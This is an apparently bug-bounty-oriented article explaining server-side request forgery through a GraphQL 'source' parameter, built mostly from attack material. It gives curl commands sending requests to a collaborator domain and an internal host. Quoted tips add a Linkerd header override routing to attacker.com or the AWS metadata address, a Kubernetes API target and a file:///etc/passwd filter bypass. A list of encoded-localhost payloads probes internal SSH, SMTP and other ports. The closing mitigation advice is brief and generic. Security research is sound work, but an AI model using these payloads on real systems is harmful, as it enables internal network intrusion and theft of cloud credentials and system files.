---
description: 'Ref: https://hackerone.com/reports/1864188'
cover: ../../.gitbook/assets/Blue Pink Gradient Fashion Banner (1).png
coverY: 0
---

# 🤯 Understanding SSRF Vulnerabilities and Their Impact

## &#x20;:heavy\_multiplication\_x: [<mark style="color:red;">Twitter</mark>](https://twitter.com/Cipher0ps\_tech?t=MlqumIay8I49eWwhjgrotg\&s=09) :link: [<mark style="color:red;">Linkedin</mark>](https://www.linkedin.com/company/cipherops/) :tv: [<mark style="color:red;">Telegram</mark>](https://t.me/cipherops\_tech) :tada: <mark style="color:red;">I</mark>[<mark style="color:red;">nstagram</mark>](https://instagram.com/cipherops\_tech?igshid=MzNlNGNkZWQ4Mg==)



Server-Side Request Forgery (SSRF) is a critical security vulnerability that allows attackers to send unauthorized requests from the server to other internal or external resources. In this article, we will analyze some examples of SSRF queries and curl commands to better comprehend the severity of this issue.

#### SSRF Request with GraphQL Query Parameter

```json
query {
  allTicks(symbol:"TSLA", source:"https://[COLLABORATOR_DOMAIN]/") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xxx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://[COLLABORATOR_DOMAIN]/\"){ symbol server source ask time bid } }"}'
```

In this example, the GraphQL query contains a vulnerable parameter `source` that accepts a URL. An attacker can manipulate this URL to make the server send a request to their controlled domain, referred to as `[COLLABORATOR_DOMAIN]`, potentially leading to data leakage or unauthorized access.

#### SSRF Request with GET Parameters inside GraphQL JSON

```json
query {
  allTicks(symbol:"TSLA", source:"https://[COLLABORATOR_DOMAIN]/?do=something&") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://[COLLABORATOR_DOMAIN]//?do=something&\"){ symbol server source ask time bid } }"}'
```

Here, the GraphQL query includes GET parameters in the URL. An attacker can exploit this by modifying the parameters and potentially impacting the behavior of the server, leading to various security risks.

#### SSRF Request to Internal Host

```json
query {
  allTicks(symbol:"TSLA", source:"https://█████/?") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xxx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://https://████/?\"){ symbol server source ask time bid } }"}'
```

```markdown
# A tip onn ssrf from Twitter
#bugbountytip Found Linkerd service (look for headers such as “Via: linkerd” or “l5d-*”)? Try SSRF by overriding dtab via request header, e.g. “l5d-dtab: /svc/* => /$/inet/attacker.com/80” to reach your server or “l5d-dtab: /svc/* => /$/inet/169.254.169.254/80” for AWS metadata.

#Bugbountytip Got a SSRF? no metadata endpoints to hit? Try https://kubernetes.default.svc/metrics if you get a load crap come back jackpot you've hit the kubernetes API and this should indicate it's shit the bed time for any security team. (url can change)

SSRF are ❤️

file:///etc/passwd : Not authorized
file://\/\/etc/passwd : Work 😀

#BugBounty

SSRF payloads
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ 
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ http://192.168.0.1
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
HTTP
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
#kongsec

If you have a blind SSRF that can only read images (but for some reason can't read ICO files), try and find Confluence running on the internal network and request /images/icons/linkext7.gif to prove that you can access internal resources

```

{% embed url="https://x.com/chybeta/status/1176165964196376576?s=20" %}

<img src="https://2207729183-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LbWrDBBrbM1WtGeIKRO%2F-MTAEQ3wRjUmCfcVCv3d%2F-MTAErI78RbCVBhg8jGj%2Fimage.png?alt=media&#x26;token=f90e59f3-c38b-48ea-b8b3-e7f1484bff66" alt="" data-size="original">



In this instance, the GraphQL query includes a modified URL with the placeholder `█████`, suggesting an attempt to perform an SSRF request to an internal host. If successful, this could expose sensitive information or services running on the internal network.

#### Conclusion

SSRF vulnerabilities are serious threats that require immediate attention from developers and security teams. To mitigate SSRF risks, it is essential to validate and sanitize user-provided URLs and limit access to sensitive internal resources.

Remember, proactive security measures and regular vulnerability assessments are crucial in maintaining a robust and secure web application. Stay vigilant, and always prioritize cybersecurity to protect both your users and your organization.

***
